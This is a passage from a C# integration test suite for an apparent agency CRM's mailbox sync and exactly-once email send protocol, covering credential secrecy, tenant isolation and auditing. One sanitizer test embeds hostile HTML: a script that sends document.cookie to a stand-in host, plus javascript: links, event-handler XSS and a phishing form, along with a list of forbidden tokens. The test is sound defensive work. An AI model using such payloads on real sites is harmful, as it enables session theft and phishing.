using System.Net;
using System.Net.Http.Json;
using AgencyOS.Application.Abstractions;
using AgencyOS.Application.Communications;
using AgencyOS.Contracts;
using AgencyOS.Contracts.Documents;
using AgencyOS.Contracts.PeopleSlice;
using AgencyOS.Domain.Audit;
using AgencyOS.Domain.Authorization;
using AgencyOS.Domain.Common;
using AgencyOS.Domain.Communications;
using AgencyOS.Infrastructure.Communications;
using AgencyOS.Infrastructure.Persistence;
using AgencyOS.Tests.Integration.Infrastructure;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Xunit;

namespace AgencyOS.Tests.Integration;

/// <summary>
/// The M10 communications surface, end to end against PostgreSQL.
/// </summary>
/// <remarks>
/// <para>
/// The send protocol is what these tests exist for. Its hard case is a provider
/// that accepted a message and then failed to say so, and the property that
/// matters is that AgencyOS never resends on a guess: one canonical intent
/// produces at most one message in somebody's inbox (ADR-0028).
/// </para>
/// <para>
/// The deterministic fake provider is what makes that testable. It can lose an
/// acknowledgement on demand, which no real mailbox will do when asked. These
/// tests are <strong>not</strong> evidence about Microsoft Graph; that claim is
/// made separately, or not at all.
/// </para>
/// </remarks>
[Collection(AgencyOsCollection.Name)]
public sealed class CommunicationTests
{
    private readonly AgencyOsTestFixture _fixture;

    public CommunicationTests(AgencyOsTestFixture fixture) => _fixture = fixture;

    // -------------------------------------------------------------- mailboxes

    /// <summary>
    /// Connecting a mailbox stores a credential, and no response anywhere carries
    /// one.
    /// </summary>
    /// <remarks>
    /// Checked over the raw JSON rather than the typed contract, because the
    /// guarantee is about what leaves the server. The stored token is checked
    /// directly against the database: it must not be the plaintext the provider
    /// issued (ADR-0027).
    /// </remarks>
    [Fact]
    public async Task ConnectingAMailbox_StoresACredentialAndReturnsNone()
    {
        Actor a = await ActorAsync("m10-connect");

        string code = Guid.NewGuid().ToString("N");

        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        CommunicationAccountResponse account = (await AccountsAsync(a))
            .Single(x => x.Id == connected.AccountId);

        Assert.Equal("Fake", account.Provider);
        Assert.Equal("Connected", account.State);
        Assert.Equal("Private", account.Visibility);
        Assert.True(account.HasStoredCredential);

        // The plaintext the fake issued, which must appear nowhere.
        string plaintext = $"fake-refresh-{code}";

        string json = await a.Client.GetStringAsync($"{a.Root}/communication-accounts");

        Assert.DoesNotContain(plaintext, json, StringComparison.Ordinal);
        Assert.DoesNotContain("refreshToken", json, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("accessToken", json, StringComparison.OrdinalIgnoreCase);

        // And what the database holds is not the token either.
        await using AgencyOsDbContextScope scope = Scope();

        CommunicationAccount stored = await scope.Accounts(connected.AccountId);

        Assert.NotNull(stored.ProtectedRefreshToken);
        Assert.NotEqual(plaintext, stored.ProtectedRefreshToken);
        Assert.DoesNotContain(code, stored.ProtectedRefreshToken!, StringComparison.Ordinal);
    }

    /// <summary>Disconnecting destroys the credential and keeps the correspondence.</summary>
    [Fact]
    public async Task Disconnecting_DestroysTheCredentialAndKeepsTheMessages()
    {
        Actor a = await ActorAsync("m10-disconnect");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound("Terms attached", "producer@studio.test"));

        await SynchronizeAsync(a, connected.AccountId);

        Assert.Single(await MessagesAsync(a));

        CommunicationAccountResponse account = (await AccountsAsync(a))
            .Single(x => x.Id == connected.AccountId);

        await NoContentAsync(a.Client.PostAsJsonAsync(
            $"{a.Root}/communication-accounts/{connected.AccountId}/disconnect",
            new DisconnectMailboxRequest(account.Version)));

        CommunicationAccountResponse after = (await AccountsAsync(a))
            .Single(x => x.Id == connected.AccountId);

        Assert.Equal("Disconnected", after.State);
        Assert.False(after.HasStoredCredential);

        // The correspondence stays. It is a record of what was said, and losing
        // access to a mailbox is not a reason to lose the negotiation it carried.
        Assert.Single(await MessagesAsync(a));

        await using AgencyOsDbContextScope scope = Scope();

        Assert.Null((await scope.Accounts(connected.AccountId)).ProtectedRefreshToken);
    }

    /// <summary>A private mailbox is not readable by another member of the tenant.</summary>
    /// <remarks>
    /// The whole point of mailbox visibility. Sharing a tenant with somebody is not
    /// an argument for reading their correspondence, and generic CRM access is not
    /// mailbox access (ADR-0026).
    /// </remarks>
    [Fact]
    public async Task APrivateMailbox_IsNotReadableByOtherMembers()
    {
        SeededActor owner = await _fixture.SeedActorAsync(AgencyRole.Owner, "m10-vis-owner");
        SeededActor first = await SeedIntoAsync(owner, AgencyRole.Member, "m10-vis-first");
        SeededActor second = await SeedIntoAsync(owner, AgencyRole.Member, "m10-vis-second");

        Actor mine = Actor.For(_fixture, first, owner);
        Actor theirs = Actor.For(_fixture, second, owner);

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(mine, code);

        Seed(code, Inbound("Private correspondence", "counsel@firm.test"));

        await SynchronizeAsync(mine, connected.AccountId);

        Assert.Single(await MessagesAsync(mine));

        // Another member of the same tenant sees nothing: not the mailbox, not its
        // messages, and not a count of them.
        Assert.Empty(await MessagesAsync(theirs));
        Assert.DoesNotContain(await AccountsAsync(theirs), x => x.Id == connected.AccountId);

        Guid messageId = (await MessagesAsync(mine))[0].Id;

        // Absent rather than refused. A refusal would confirm that this message
        // exists in a colleague's mailbox, which for correspondence is already the
        // disclosure: it says who is talking to whom (ADR-0026).
        Assert.Equal(
            HttpStatusCode.NotFound,
            (await theirs.Client.GetAsync($"{theirs.Root}/messages/{messageId}")).StatusCode);
    }

    // ------------------------------------------------------------------- sync

    /// <summary>
    /// Synchronization is idempotent: the same provider message never becomes two
    /// rows.
    /// </summary>
    [Fact]
    public async Task Synchronization_IsIdempotent()
    {
        Actor a = await ActorAsync("m10-sync-idempotent");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound("First", "one@studio.test"), Inbound("Second", "two@studio.test"));

        MailboxSyncResult first = await SynchronizeAsync(a, connected.AccountId);

        Assert.Equal(2, first.MessagesCreated);
        Assert.Equal(2, (await MessagesAsync(a)).Count);

        // Running again from the stored cursor adds nothing.
        MailboxSyncResult second = await SynchronizeAsync(a, connected.AccountId);

        Assert.Equal(0, second.MessagesCreated);
        Assert.Equal(2, (await MessagesAsync(a)).Count);
    }

    /// <summary>
    /// A provider that forgets its cursor is asking for a full resynchronization,
    /// and gets one without duplicating anything.
    /// </summary>
    /// <remarks>
    /// Not an error. A delta cursor expires for ordinary reasons, and the only
    /// correct response is to start again - which is safe precisely because every
    /// write is keyed on the provider's own message id (ADR-0026).
    /// </remarks>
    [Fact]
    public async Task AnExpiredCursor_CausesAFullResyncWithoutDuplicates()
    {
        Actor a = await ActorAsync("m10-cursor");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound("One", "one@studio.test"), Inbound("Two", "two@studio.test"));

        await SynchronizeAsync(a, connected.AccountId);

        Assert.Equal(2, (await MessagesAsync(a)).Count);

        Mailbox(code).Next = FakeProviderBehaviour.ExpireCursor;

        MailboxSyncResult expired = await SynchronizeAsync(a, connected.AccountId);

        Assert.True(expired.CursorReset);

        // The cursor is gone, so the next run reads everything again - and writes
        // nothing, because the rows already exist.
        MailboxSyncResult again = await SynchronizeAsync(a, connected.AccountId);

        Assert.Equal(0, again.MessagesCreated);
        Assert.Equal(2, (await MessagesAsync(a)).Count);
    }

    /// <summary>Hostile HTML is sanitized once, on the way in.</summary>
    /// <remarks>
    /// Sanitized at storage rather than at render, so every future surface reads
    /// something already safe. External image references go too: a remote image in
    /// a stored message would tell its sender that somebody opened it, years later
    /// (ADR-0026).
    /// </remarks>
    [Fact]
    public async Task HostileHtml_IsSanitizedBeforeItIsStored()
    {
        Actor a = await ActorAsync("m10-sanitize");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        const string hostile =
            "<p>Real content.</p>"
            + "<script>fetch('https://exfiltrate.test?c='+document.cookie)</script>"
            + "<img src=\"https://tracker.test/beacon.gif\" />"
            + "<iframe src=\"https://elsewhere.test\"></iframe>"
            + "<a href=\"javascript:alert(1)\">click</a>"
            + "<div onclick=\"alert(1)\" style=\"position:fixed\">styled</div>"
            + "<form action=\"https://phish.test\"><input name=\"password\" /></form>"
            + "<object data=\"x\"></object><embed src=\"y\" /><svg onload=\"alert(1)\"></svg>";

        Seed(code, Inbound("Hostile", "attacker@elsewhere.test", html: hostile));

        await SynchronizeAsync(a, connected.AccountId);

        MessageDetailResponse detail = await GetAsync<MessageDetailResponse>(
            a, $"messages/{(await MessagesAsync(a))[0].Id}");

        string html = detail.SanitizedHtml!;

        foreach (string forbidden in new[]
        {
            "<script", "</script", "<iframe", "<object", "<embed", "<svg", "<form",
            "<input", "onclick", "onload", "javascript:", "tracker.test",
            "exfiltrate.test", "phish.test", "style=",
        })
        {
            Assert.DoesNotContain(forbidden, html, StringComparison.OrdinalIgnoreCase);
        }

        // What a person actually wrote survives.
        Assert.Contains("Real content.", html, StringComparison.Ordinal);
    }

    // ---------------------------------------------------------- participants

    /// <summary>
    /// An address that matches several records is reported as ambiguous, and
    /// AgencyOS chooses none of them.
    /// </summary>
    [Fact]
    public async Task AnAmbiguousAddress_IsNeverResolvedAutomatically()
    {
        Actor a = await ActorAsync("m10-ambiguous");

        const string shared = "desk@studio.test";

        PersonDetailResponse one = await CreatePersonAsync(a, "Ada Sallow", shared);
        PersonDetailResponse two = await CreatePersonAsync(a, "Nell Rowan", shared);

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound("From a shared desk", shared));

        await SynchronizeAsync(a, connected.AccountId);

        MessageSummaryResponse message = (await MessagesAsync(a))[0];

        MessageDetailResponse detail = await GetAsync<MessageDetailResponse>(
            a, $"messages/{message.Id}");

        ParticipantResponse sender = detail.Participants.Single(x => x.Role == "From");

        // Nothing was decided. The raw address and name are exactly as the mail
        // carried them.
        Assert.Null(sender.PersonId);
        Assert.Equal(shared, sender.Address);

        IReadOnlyList<ParticipantSuggestionResponse> suggestions =
            await GetAsync<ParticipantSuggestionResponse[]>(
                a, $"participant-suggestions?address={Uri.EscapeDataString(shared)}");

        Assert.Equal(2, suggestions.Count);
        Assert.All(suggestions, x => Assert.False(x.IsUnambiguous));
        Assert.Contains(suggestions, x => x.PersonId == one.Person.Id);
        Assert.Contains(suggestions, x => x.PersonId == two.Person.Id);

        // A person chooses, and the raw address still does not change.
        await NoContentAsync(a.Client.PostAsJsonAsync(
            $"{a.Root}/messages/{message.Id}/participants/{sender.Id}",
            new ResolveParticipantRequest(one.Person.Id)));

        MessageDetailResponse resolved = await GetAsync<MessageDetailResponse>(
            a, $"messages/{message.Id}");

        ParticipantResponse after = resolved.Participants.Single(x => x.Role == "From");

        Assert.Equal(one.Person.Id, after.PersonId);
        Assert.Equal(shared, after.Address);
        Assert.Equal("Ada Sallow", after.PersonDisplayName);
    }

    /// <summary>Attachment bytes are canonical only once they are actually ingested.</summary>
    [Fact]
    public async Task AnAttachment_BecomesADocumentOnlyWhenItIsIngested()
    {
        Actor a = await ActorAsync("m10-attachment");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound(
            "Executed copy attached",
            "counsel@firm.test",
            attachments: [new ProviderAttachment("att-1", "executed.txt", "text/plain", 24, false)]));

        await SynchronizeAsync(a, connected.AccountId);

        MessageDetailResponse detail = await GetAsync<MessageDetailResponse>(
            a, $"messages/{(await MessagesAsync(a))[0].Id}");

        MessageAttachmentResponse attachment = Assert.Single(detail.Attachments);

        // Known to exist, and nothing more. AgencyOS holds none of its bytes.
        Assert.False(attachment.HoldsContent);
        Assert.Null(attachment.DocumentId);
        Assert.Empty(await GetAsync<DocumentSummaryResponse[]>(a, "documents"));

        IngestAttachmentResponse ingested = await PostAsync<IngestAttachmentResponse>(
            a,
            $"message-attachments/{attachment.Id}/ingest",
            new IngestAttachmentRequest("CorrespondenceAttachment", "Confidential", "Executed copy"));

        Assert.Equal(64, ingested.ContentHash.Length);
        Assert.True(ingested.ByteLength > 0);

        MessageDetailResponse after = await GetAsync<MessageDetailResponse>(
            a, $"messages/{(await MessagesAsync(a))[0].Id}");

        MessageAttachmentResponse stored = Assert.Single(after.Attachments);

        Assert.True(stored.HoldsContent);
        Assert.Equal(ingested.DocumentId, stored.DocumentId);

        DocumentSummaryResponse document =
            Assert.Single(await GetAsync<DocumentSummaryResponse[]>(a, "documents"));

        Assert.Equal("Executed copy", document.Title);
        Assert.Equal("CorrespondenceAttachment", document.Kind);
        Assert.Equal("Confidential", document.Sensitivity);
    }

    /// <summary>
    /// Filing a message against a deal records relevance and changes nothing else.
    /// </summary>
    [Fact]
    public async Task LinkingAMessage_IsEvidenceAndNotAStateChange()
    {
        Actor a = await ActorAsync("m10-message-link");

        PersonDetailResponse person = await CreatePersonAsync(a, "Ada Sallow", "ada@writers.test");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound("We accept the terms", "ada@writers.test"));

        await SynchronizeAsync(a, connected.AccountId);

        MessageSummaryResponse message = (await MessagesAsync(a))[0];

        LinkMessageResponse link = await PostAsync<LinkMessageResponse>(
            a,
            $"messages/{message.Id}/links",
            new LinkMessageRequest("Person", person.Person.Id, "Says they accept"));

        MessageDetailResponse detail = await GetAsync<MessageDetailResponse>(
            a, $"messages/{message.Id}");

        MessageLinkResponse filed = Assert.Single(detail.Links);

        Assert.Equal("Person", filed.Target);
        Assert.Equal("Ada Sallow", filed.TargetLabel);

        // The message says "we accept". Nothing in AgencyOS accepted anything: an
        // email is evidence somebody wrote a sentence, and a person still issues
        // the command (ADR-0026).
        HttpResponseMessage unlinked = await a.Client.DeleteAsync(
            $"{a.Root}/messages/{message.Id}/links/{link.LinkId}");

        Assert.Equal(HttpStatusCode.NoContent, unlinked.StatusCode);
    }

    // --------------------------------------------------------- outbound send

    /// <summary>Compose, queue, send - and every state along the way is durable.</summary>
    [Fact]
    public async Task Sending_WalksTheProtocolToSent()
    {
        Actor a = await ActorAsync("m10-send");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        ComposeMessageResponse composed = await ComposeAsync(a, connected.AccountId);

        OutboundDispatchResponse draft = await DispatchAsync(a, composed.DispatchId);

        // Composing sends nothing. This is the last point at which cancelling is
        // still honest.
        Assert.Equal("Draft", draft.State);
        Assert.False(draft.HasProviderDraft);
        Assert.Equal(0, draft.AttemptCount);

        await NoContentAsync(a.Client.PostAsJsonAsync(
            $"{a.Root}/outbound-messages/{composed.DispatchId}/queue",
            new QueueMessageRequest(draft.Version)));

        Assert.Equal("Queued", (await DispatchAsync(a, composed.DispatchId)).State);

        // A draft at the provider first: repeatable, invisible outside, and it buys
        // the identifier that makes recovery possible.
        Assert.Equal(
            OutboundDispatchState.ProviderDraftCreated, await StepAsync(composed.DispatchId));

        Assert.True((await DispatchAsync(a, composed.DispatchId)).HasProviderDraft);

        // The send. The state is written before the provider is called.
        Assert.Equal(OutboundDispatchState.Sent, await StepAsync(composed.DispatchId));

        OutboundDispatchResponse sent = await DispatchAsync(a, composed.DispatchId);

        Assert.Equal("Sent", sent.State);
        Assert.True(sent.HasProviderEvidence);
        Assert.NotNull(sent.SentAt);
        Assert.False(sent.NeedsAttention);

        // Exactly one message reached the recipient.
        Assert.Equal(1, Mailbox(code).SendCommitCount);
    }

    /// <summary>
    /// THE ONE THAT MATTERS. A lost acknowledgement never becomes a second send.
    /// </summary>
    /// <remarks>
    /// The provider accepted the message and could not say so. AgencyOS cannot tell
    /// that apart from a send that never happened, and the two demand opposite
    /// responses. It says the outcome is unknown, goes and looks, and finds the
    /// message - having sent it exactly once (ADR-0028).
    /// </remarks>
    [Fact]
    public async Task ALostAcknowledgement_BecomesUnknownAndConvergesToSent()
    {
        Actor a = await ActorAsync("m10-lost-ack");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Guid dispatchId = await QueueAsync(a, connected.AccountId);

        Assert.Equal(OutboundDispatchState.ProviderDraftCreated, await StepAsync(dispatchId));

        Mailbox(code).Next = FakeProviderBehaviour.LoseAcknowledgementAfterSending;

        Assert.Equal(OutboundDispatchState.UnknownOutcome, await StepAsync(dispatchId));

        OutboundDispatchResponse unknown = await DispatchAsync(a, dispatchId);

        // Not a failure. The distinction is the whole design.
        Assert.Equal("UnknownOutcome", unknown.State);
        Assert.True(unknown.NeedsAttention);

        // The message did go, once.
        Assert.Equal(1, Mailbox(code).SendCommitCount);

        // Reconciliation finds it and the state converges to Sent, without a second
        // send having been attempted.
        Assert.Equal(OutboundDispatchState.Sent, await StepAsync(dispatchId));

        OutboundDispatchResponse settled = await DispatchAsync(a, dispatchId);

        Assert.Equal("Sent", settled.State);
        Assert.Equal("FoundSent", settled.LastVerdict);
        Assert.True(settled.HasProviderEvidence);

        Assert.Equal(1, Mailbox(code).SendCommitCount);
    }

    /// <summary>
    /// A send that never happened is proven absent, and only then retried.
    /// </summary>
    /// <remarks>
    /// Absence alone proves nothing: a provider that lost the draft and sent the
    /// message would look the same. What makes the retry safe is the draft still
    /// being there beside the missing sent message (ADR-0028).
    /// </remarks>
    [Fact]
    public async Task AnUnansweredSend_IsRetriedOnlyOnceProvenAbsent()
    {
        Actor a = await ActorAsync("m10-proven-absent");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Guid dispatchId = await QueueAsync(a, connected.AccountId);

        Assert.Equal(OutboundDispatchState.ProviderDraftCreated, await StepAsync(dispatchId));

        Mailbox(code).Next = FakeProviderBehaviour.TimeOutWithoutSending;

        Assert.Equal(OutboundDispatchState.UnknownOutcome, await StepAsync(dispatchId));

        // Nothing was sent, and AgencyOS does not know that yet.
        Assert.Equal(0, Mailbox(code).SendCommitCount);

        // Reconciliation proves it: no sent message, and the draft is still there.
        Assert.Equal(OutboundDispatchState.ProviderDraftCreated, await StepAsync(dispatchId));

        Assert.Equal("ProvenAbsent", (await DispatchAsync(a, dispatchId)).LastVerdict);

        // Now the retry is safe, and it produces exactly one message.
        Assert.Equal(OutboundDispatchState.Sent, await StepAsync(dispatchId));

        Assert.Equal(1, Mailbox(code).SendCommitCount);
    }

    /// <summary>
    /// An inconclusive reconciliation leaves the outcome unknown rather than
    /// guessing.
    /// </summary>
    [Fact]
    public async Task AnInconclusiveReconciliation_LeavesTheOutcomeUnknown()
    {
        Actor a = await ActorAsync("m10-inconclusive");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Guid dispatchId = await QueueAsync(a, connected.AccountId);

        await StepAsync(dispatchId);

        Mailbox(code).Next = FakeProviderBehaviour.LoseAcknowledgementAfterSending;

        Assert.Equal(OutboundDispatchState.UnknownOutcome, await StepAsync(dispatchId));

        Mailbox(code).Next = FakeProviderBehaviour.ReconcileInconclusive;

        Assert.Equal(OutboundDispatchState.UnknownOutcome, await StepAsync(dispatchId));

        OutboundDispatchResponse still = await DispatchAsync(a, dispatchId);

        // Reported as itself, and never rounded to a failure.
        Assert.Equal("UnknownOutcome", still.State);
        Assert.Equal("Inconclusive", still.LastVerdict);
        Assert.True(still.NeedsAttention);

        // It still appears where a person will see it.
        CommunicationCommandCenterResponse desk =
            await GetAsync<CommunicationCommandCenterResponse>(a, "communications/command-center");

        Assert.Equal(1, desk.UnknownOutcomeCount);
        Assert.Equal(0, desk.FailedSendCount);
        Assert.Contains(desk.UnknownOutcomes, x => x.Id == dispatchId);
    }

    /// <summary>A stated refusal is a failure, and is retried.</summary>
    [Fact]
    public async Task AStatedRefusal_IsAFailureAndIsRetried()
    {
        Actor a = await ActorAsync("m10-refused");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Guid dispatchId = await QueueAsync(a, connected.AccountId);

        await StepAsync(dispatchId);

        Mailbox(code).Next = FakeProviderBehaviour.RejectSend;

        Assert.Equal(OutboundDispatchState.FailedRetryable, await StepAsync(dispatchId));

        // The provider said it did not send, so returning to a sendable state
        // cannot duplicate anything.
        Assert.Equal(0, Mailbox(code).SendCommitCount);

        OutboundDispatchResponse failed = await DispatchAsync(a, dispatchId);

        Assert.Equal("FailedRetryable", failed.State);
        Assert.NotNull(failed.LastError);
    }

    /// <summary>Cancelling is possible before the provider, and never after.</summary>
    [Fact]
    public async Task Cancelling_IsPossibleOnlyBeforeAnythingReachesTheProvider()
    {
        Actor a = await ActorAsync("m10-cancel");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        ComposeMessageResponse composed = await ComposeAsync(a, connected.AccountId);

        OutboundDispatchResponse draft = await DispatchAsync(a, composed.DispatchId);

        await NoContentAsync(a.Client.PostAsJsonAsync(
            $"{a.Root}/outbound-messages/{composed.DispatchId}/cancel",
            new CancelMessageRequest(draft.Version)));

        Assert.Equal("Cancelled", (await DispatchAsync(a, composed.DispatchId)).State);

        // A second dispatch, taken past the point of no return.
        Guid sent = await QueueAsync(a, connected.AccountId);

        await StepAsync(sent);
        await StepAsync(sent);

        OutboundDispatchResponse delivered = await DispatchAsync(a, sent);

        Assert.Equal("Sent", delivered.State);

        HttpResponseMessage refused = await a.Client.PostAsJsonAsync(
            $"{a.Root}/outbound-messages/{sent}/cancel",
            new CancelMessageRequest(delivered.Version));

        // AgencyOS cannot unsend anything and does not pretend to.
        Assert.Equal(HttpStatusCode.BadRequest, refused.StatusCode);
    }

    /// <summary>
    /// Two workers reaching into the same queue never take the same dispatch.
    /// </summary>
    /// <remarks>
    /// <para>
    /// The claim is a row lock with an expiring lease, taken with
    /// <c>FOR UPDATE SKIP LOCKED</c>. Without it two instances would each create a
    /// provider draft for one intent and each send it, which is the duplicate the
    /// whole protocol exists to prevent (ADR-0029).
    /// </para>
    /// <para>
    /// The assertion is about the pair of claims rather than about one particular
    /// row, because a worker takes whatever is next and the suite shares a
    /// database. "No two workers hold the same dispatch" is the property that
    /// matters and the one the lock provides; which row each got is not.
    /// </para>
    /// </remarks>
    [Fact]
    public async Task TwoWorkers_RacingTheQueue_NeverTakeTheSameDispatch()
    {
        Actor a = await ActorAsync("m10-race");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        // At least one claimable row exists, so the race has something to race for.
        await QueueAsync(a, connected.AccountId);

        // Both claim at the same moment, from separate scopes and separate
        // connections, exactly as two hosts would.
        Guid?[] claimed = await Task.WhenAll(
            ClaimOnceAsync("worker-one"),
            ClaimOnceAsync("worker-two"));

        Guid[] taken = [.. claimed.Where(x => x is not null).Select(x => x!.Value)];

        Assert.NotEmpty(taken);
        Assert.Equal(taken.Length, taken.Distinct().Count());
    }

    /// <summary>
    /// A worker that dies mid-send leaves a row that says a send may have happened.
    /// </summary>
    /// <remarks>
    /// The reason the state is written before the provider call. A recovering
    /// worker finds <c>SendRequested</c>, concludes nothing, and reconciles rather
    /// than sending again (ADR-0028).
    /// </remarks>
    [Fact]
    public async Task ACrashMidSend_RecoversByReconcilingRatherThanResending()
    {
        Actor a = await ActorAsync("m10-crash");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Guid dispatchId = await QueueAsync(a, connected.AccountId);

        await StepAsync(dispatchId);

        // The crash: the row is moved to SendRequested and the process dies before
        // the provider answers. The message did go.
        await using (AgencyOsDbContextScope scope = Scope())
        {
            await scope.SimulateCrashDuringSendAsync(dispatchId);
        }

        Mailbox(code).Sent[await ClientReferenceAsync(dispatchId)] = new ProviderMessage(
            "sent-recovered",
            MessageDirection.Outbound,
            null,
            "<recovered@agencyos.test>",
            "Terms",
            "Body",
            null,
            DateTimeOffset.UtcNow,
            null,
            "SentItems",
            [],
            []);

        // A recovering worker never sends on the strength of not knowing. It marks
        // the outcome unknown and goes looking, which here finds the message the
        // dead process had already sent.
        Assert.Equal(OutboundDispatchState.Sent, await StepAsync(dispatchId));

        OutboundDispatchResponse recovered = await DispatchAsync(a, dispatchId);

        Assert.Equal("FoundSent", recovered.LastVerdict);
        Assert.True(recovered.HasProviderEvidence);

        // Nothing was sent by this process. The recipient has one message, from
        // the attempt that crashed.
        Assert.Equal(0, Mailbox(code).SendCommitCount);
    }

    /// <summary>Sending from a mailbox somebody else owns is refused.</summary>
    [Fact]
    public async Task SendingFromAnotherMembersMailbox_IsRefused()
    {
        SeededActor owner = await _fixture.SeedActorAsync(AgencyRole.Owner, "m10-spoof-owner");
        SeededActor first = await SeedIntoAsync(owner, AgencyRole.Member, "m10-spoof-first");
        SeededActor second = await SeedIntoAsync(owner, AgencyRole.Member, "m10-spoof-second");

        Actor mine = Actor.For(_fixture, first, owner);
        Actor theirs = Actor.For(_fixture, second, owner);

        ConnectMailboxResponse connected = await ConnectAsync(mine, Guid.NewGuid().ToString("N"));

        HttpResponseMessage response = await theirs.Client.PostAsJsonAsync(
            $"{theirs.Root}/outbound-messages",
            new ComposeMessageRequest(
                connected.AccountId,
                "Sent as somebody else",
                "Body",
                [new RecipientRequest("To", "recipient@studio.test")]));

        // Knowing the identifier buys nothing: the server checks the owner.
        Assert.True(
            response.StatusCode is HttpStatusCode.NotFound or HttpStatusCode.Forbidden,
            $"Expected a refusal, got {(int)response.StatusCode}.");
    }

    /// <summary>Nothing in a message list crosses a tenant.</summary>
    [Fact]
    public async Task MessagesAndDispatches_NeverCrossTenants()
    {
        Actor a = await ActorAsync("m10-tenant-a");
        Actor b = await ActorAsync("m10-tenant-b");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound("Theirs alone", "counsel@firm.test"));

        await SynchronizeAsync(a, connected.AccountId);

        Guid messageId = (await MessagesAsync(a))[0].Id;

        Assert.Empty(await MessagesAsync(b));
        Assert.Empty(await AccountsAsync(b));

        Assert.Equal(
            HttpStatusCode.NotFound,
            (await b.Client.GetAsync($"{b.Root}/messages/{messageId}")).StatusCode);
    }

    /// <summary>
    /// Synchronizing and reading a mailbox are not audited; managing one is.
    /// </summary>
    /// <remarks>
    /// A worker polls every mailbox on a timer. Auditing that would produce an
    /// entry per mailbox per cycle for ever, and the trail exists to answer who
    /// changed something rather than who looked (ADR-0012). The curated
    /// communication history records the synchronization; the audit trail records
    /// the decisions.
    /// </remarks>
    [Fact]
    public async Task PollingAndReadingAreNotAudited_AndManagingAMailboxIs()
    {
        Actor a = await ActorAsync("m10-comm-audit");

        string code = Guid.NewGuid().ToString("N");
        ConnectMailboxResponse connected = await ConnectAsync(a, code);

        Seed(code, Inbound("Ordinary", "producer@studio.test"));

        // Three synchronization cycles and every read the surface offers.
        await SynchronizeAsync(a, connected.AccountId);
        await SynchronizeAsync(a, connected.AccountId);
        await SynchronizeAsync(a, connected.AccountId);

        Guid messageId = (await MessagesAsync(a))[0].Id;

        await GetAsync<MessageDetailResponse>(a, $"messages/{messageId}");
        await AccountsAsync(a);
        await GetAsync<CommunicationCommandCenterResponse>(a, "communications/command-center");

        await using AgencyOsDbContext context = _fixture.CreateDbContext();

        AuditEvent[] entries =
        [
            .. await context.AuditEvents
                .AsNoTracking()
                .Where(x => x.EntityId == connected.AccountId.ToString())
                .ToListAsync(),
        ];

        // Exactly one, for connecting the mailbox.
        AuditEvent record = Assert.Single(entries);

        Assert.Equal(AuditAction.CommunicationAccountConnected, record.Action);

        // Nothing was audited against the message either.
        Assert.False(
            await context.AuditEvents
                .AsNoTracking()
                .AnyAsync(x => x.EntityId == messageId.ToString()),
            "Reading a message should leave no audit entry.");

        // Disconnecting destroys a credential, and is audited.
        CommunicationAccountResponse account = (await AccountsAsync(a))
            .Single(x => x.Id == connected.AccountId);

        await NoContentAsync(a.Client.PostAsJsonAsync(
            $"{a.Root}/communication-accounts/{connected.AccountId}/disconnect",
            new DisconnectMailboxRequest(account.Version)));

        await using AgencyOsDbContext after = _fixture.CreateDbContext();

        Assert.True(
            await after.AuditEvents
                .AsNoTracking()
                .AnyAsync(x =>
                    x.EntityId == connected.AccountId.ToString()
                    && x.Action == AuditAction.CommunicationAccountDisconnected),
            "Disconnecting a mailbox should be audited.");
    }

    // ---------------------------------------------------------------- helpers

    private sealed record Actor(HttpClient Client, string Root)
    {
        public static Actor For(
            AgencyOsTestFixture fixture,
            SeededActor actor,
            SeededActor? tenantOwner = null) =>
            new(
                fixture.CreateClient(actor.Subject),
                $"/api/v1/organizations/{(tenantOwner ?? actor).Organization.Id.Value}");
    }

    private async Task<Actor> ActorAsync(string label, AgencyRole role = AgencyRole.Member)
    {
        SeededActor actor = await _fixture.SeedActorAsync(role, label);

        return Actor.For(_fixture, actor);
    }

    private async Task<SeededActor> SeedIntoAsync(
        SeededActor tenant,
        AgencyRole role,
        string label)
    {
        string subject = $"{label}-{Guid.NewGuid():N}";

        Domain.Identity.User user = await _fixture
            .SeedUserAsync(subject, $"{label} {role}")
            .ConfigureAwait(false);

        await _fixture
            .SeedMembershipAsync(tenant.Organization.Id, user.Id, role, tenant.User.Id)
            .ConfigureAwait(false);

        return new SeededActor(subject, user, tenant.Organization);
    }

    /// <summary>The fake mailbox behind an authorization code.</summary>
    private FakeMailbox Mailbox(string code) =>
        _fixture.Factory.Services
            .GetServices<ICommunicationProvider>()
            .OfType<FakeCommunicationProvider>()
            .Single()
            .Mailbox($"fake-refresh-{code}");

    private void Seed(string code, params ProviderMessage[] messages) =>
        Mailbox(code).Inbox.AddRange(messages);

    private static ProviderMessage Inbound(
        string subject,
        string from,
        string? html = null,
